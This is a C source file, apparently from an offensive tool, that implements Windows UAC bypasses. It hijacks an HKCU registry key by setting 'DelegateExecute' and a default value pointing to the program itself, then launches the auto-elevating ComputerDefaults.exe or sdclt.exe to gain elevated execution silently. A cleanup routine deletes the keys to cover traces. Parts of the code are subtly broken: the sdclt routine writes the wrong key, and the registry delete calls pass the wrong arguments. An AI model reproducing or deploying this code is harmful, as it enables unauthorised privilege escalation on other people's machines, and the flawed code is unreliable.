#include "bypass.h"

VOID BypassUsingComputerDefaults()
{
	HKEY hKey;
	LONG openRes = RegCreateKeyExA(HKEY_CURRENT_USER, msSettingKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_READ | KEY_SET_VALUE, NULL, &hKey, NULL);

	if (openRes != ERROR_SUCCESS) {
		printf("Error creating key: %d", openRes);
	}

	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);

	LPSTR fileName = buffer;

	LONG dlgExec = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", 1);
	LONG dftVal = RegSetValueExA(hKey, NULL, 0, REG_SZ, (LPBYTE)fileName, strlen(fileName) + 1);

	if (dlgExec != ERROR_SUCCESS || dftVal != ERROR_SUCCESS) {
		printf("Error writing to Registry");
		return;
	}

	StartProcess(NULL, L"C:\\Windows\\System32\\ComputerDefaults.exe");
}

VOID BypassUsingSDCLT()
{
	HKEY hKey;
	LONG openRes = RegCreateKeyExA(HKEY_CURRENT_USER, msSettingKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_READ | KEY_SET_VALUE, NULL, &hKey, NULL);

	if (openRes != ERROR_SUCCESS) {
		printf("Error creating key. %d", openRes);
	}

	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);

	LPSTR fileName = buffer;

	LONG dlgExec = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", 1);
	LONG dftVal = RegSetValueExA(hKey, NULL, 0, REG_SZ, (LPBYTE)fileName, strlen(fileName) + 1);

	if (dlgExec != ERROR_SUCCESS || dftVal != ERROR_SUCCESS) {
		printf("Error writing to Registry");
		return;
	}

	StartProcess(NULL, L"C:\\Windows\\System32\\sdclt.exe");
}

VOID Clean()
{
	DeleteKey(msSettingKey);
	DeleteKey(sdcltKey);
}

VOID DeleteKey(LPCSTR key)
{
	HKEY hKey;
	RegOpenKeyExA(HKEY_CURRENT_USER, key, 0, NULL, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	LONG delReg = RegDeleteKeyA(HKEY_CURRENT_USER, hKey);
	if (delReg != ERROR_SUCCESS)
	{
		printf("Error deleting key: %d", delReg);
	}
}